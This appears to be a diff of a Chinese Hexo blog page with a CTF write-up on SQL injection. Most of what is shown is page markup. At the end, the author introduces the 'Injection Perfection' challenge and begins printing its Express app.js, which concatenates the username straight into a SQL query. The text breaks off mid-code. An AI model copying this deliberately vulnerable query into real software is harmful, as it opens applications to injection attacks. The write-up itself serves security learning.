@@ -1,426 +1,37 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SQLI - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="SQLI"><meta property="og:type" content="blog"><meta property="og:title" content="SQLI"><meta property="og:url" content="http://example.com/2023/02/09/SQLI/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="SQLI"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/default6.png"><meta property="article:published_time" content="2023-02-09T08:30:35.000Z"><meta property="article:modified_time" content="2024-01-10T09:42:09.670Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="Web"><meta property="article:tag" content="sqli"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/default6.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/02/09/SQLI/"},"headline":"SQLI","image":["http://example.com/img/default6.png"],"datePublished":"2023-02-09T08:30:35.000Z","dateModified":"2024-01-10T09:42:09.670Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://example.com/img/icon.jpg"}},"description":"SQLI"}</script><link rel="canonical" href="http://example.com/2023/02/09/SQLI/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
 
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
 
-<!DOCTYPE html>
-<html lang="en" data-default-color-scheme=dark>
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
 
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/img/default6.png" alt="SQLI"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T08:30:35.000Z" title="2023/2/9 16:30:35">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-01-10T09:42:09.670Z" title="2024/1/10 17:42:09">2024-01-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><span> / </span><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span><span class="level-item">1 小时读完 (大约9910个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">SQLI</h1><div class="content"><!-- more -->
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
-  <link rel="icon" href="/img/icon.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Potat0w0">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="CTF After Dark-Injection Perfection因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容： 12345678910111213141516171819202122232425262728293031323334353">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SQLI">
-<meta property="og:url" content="http://example.com/2023/02/09/SQLI/index.html">
-<meta property="og:site_name" content="Potat0w0">
-<meta property="og:description" content="CTF After Dark-Injection Perfection因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容： 12345678910111213141516171819202122232425262728293031323334353">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412122726143.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412123052991.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412123949128.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213012236141.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213013114976.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213013848916.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213133221152.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213140043405.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213140715876.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213143545653.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213144232143.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213144433988.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213144916052.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213152804918.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213160841525.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213161126295.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213162154710.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213163140720.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230213164015355.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410150245999.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410153558433.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410182351129.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410194114453.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230410201414804.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230411013245234.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412103314980.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130046708.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130722783.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130832052.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130852364.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230412130941926.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230715155500241.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230715155607903.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716210307686.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716210541431.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716211039043.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716211543520.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716212625454.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716213520875.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716214135001.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230716214432222.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717133037707.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717133503945.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717133920520.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717134050816.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717134452778.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717140539335.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717144828460.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717150449907.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717150514301.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717154027281.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717154544881.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/66.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215358223.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215500916.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215554491.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230717215729390.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004643507.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004823424.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718004737058.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718005009949.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718083706449.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718084006936.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230718084437619.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230719171718086.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230719180637741.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814174550933.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814182840820.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814182932470.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814185222764.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814223619447.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230814223857407.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815003116109.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815003059843.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815004545376.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815005104471.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815011429361.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815011528753.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815012201662.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815012626998.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815021217636.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815021236797.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815021258728.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815022717060.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815022744676.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815023355034.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815215204733.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230815220041006.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816003152422.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816003708096.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816013349810.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816013546447.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816013657232.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816013833474.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816185347159.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816185906878.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816190011961.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816193015731.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816193218467.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816193816781.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816194208635.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816194849144.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195044179.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195219052.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195232417.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195607490.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195718057.png">
-<meta property="og:image" content="http://example.com/2023/02/09/SQLI/image-20230816195806826.png">
-<meta property="article:published_time" content="2023-02-09T08:30:35.000Z">
-<meta property="article:modified_time" content="2023-08-17T03:37:10.103Z">
-<meta property="article:author" content="Potat0w0">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="sqli">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/02/09/SQLI/image-20230412122726143.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>SQLI - Potat0w0</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Potat0w0&#39;s Blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="SQLI"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-author" aria-hidden="true"></i>
-        Potat0w0
-      </span>
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-09 16:30" pubdate>
-          February 9, 2023 pm
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          32k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          270 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">SQLI</h1>
-            
-              <p class="note note-info">
-                
-                  
-                    Last updated on 5 months ago
-                  
-                
-              </p>
-            
-            
-              <div class="markdown-body">
-                
-                <h2 id="CTF-After-Dark-Injection-Perfection"><a href="#CTF-After-Dark-Injection-Perfection" class="headerlink" title="CTF After Dark-Injection Perfection"></a>CTF After Dark-Injection Perfection</h2><p>因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容：</p>
+<h1 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h1><h2 id="CTF-After-Dark-Injection-Perfection"><a href="#CTF-After-Dark-Injection-Perfection" class="headerlink" title="CTF After Dark-Injection Perfection"></a>CTF After Dark-Injection Perfection</h2><p>因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> port = <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>) || <span class="hljs-number">8080</span>;<br><br><span class="hljs-keyword">const</span> sqlite3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sqlite3&#x27;</span>);<br><span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> sqlite3.<span class="hljs-title class_">Database</span>(<span class="hljs-string">&#x27;app.db&#x27;</span>, sqlite3.<span class="hljs-property">OPEN_READONLY</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(upload.<span class="hljs-title function_">array</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>		db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br>			<span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br>			<span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>		&#125;);<br>	&#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">attemptLogin</span> = (<span class="hljs-params">username, password</span>) =&gt; &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>		db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br>			<span class="hljs-keyword">if</span> (err)<br>				<span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br>			<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br>				<span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br>			<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br>				<span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br>			<span class="hljs-keyword">else</span><br>				<span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>		&#125;);<br>	&#125;)<br>&#125;;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>	res.<span class="hljs-title 